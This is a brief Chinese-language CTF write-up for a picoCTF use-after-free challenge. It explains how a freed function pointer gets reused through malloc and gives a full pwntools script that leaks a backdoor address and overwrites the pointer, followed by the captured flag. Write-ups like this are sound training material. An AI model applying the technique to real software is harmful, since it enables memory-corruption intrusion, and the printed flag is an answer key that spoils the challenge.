首先先获得后门函数的地址，然后清空掉`whatToDo`，`leaveMessage()`malloc返回的8个字节刚好就是`whatToDo`所在的位置（**malloc倾向于分配刚刚free的内存，大概是热缓存或者free-list的原因 https://stackoverflow.com/a/36044407** ），将后门地址传入，执行`doProcess()`时就会输出flag了.

**Python Script:**

```python
from pwn import *

conn = remote('mercury.picoctf.net', 61817)

conn.recvuntil("(e)xit")
conn.sendline("S")
conn.recv()
leakaddr = conn.recv().decode().split("...")[1].split("\n")[0] ## get backdoor address
leakaddr = int(leakaddr, 16)
print(leakaddr)
conn.sendline("I")
conn.recv()
conn.sendline("Y")
conn.recv()
conn.sendline("l")
conn.recv()
conn.recv()
payload = p32(leakaddr)
conn.send(payload)
flag = conn.recv().decode().split("\n")[0]
print(flag)

```

flag: `picoCTF{d0ubl3_j30p4rdy_1e154727}`

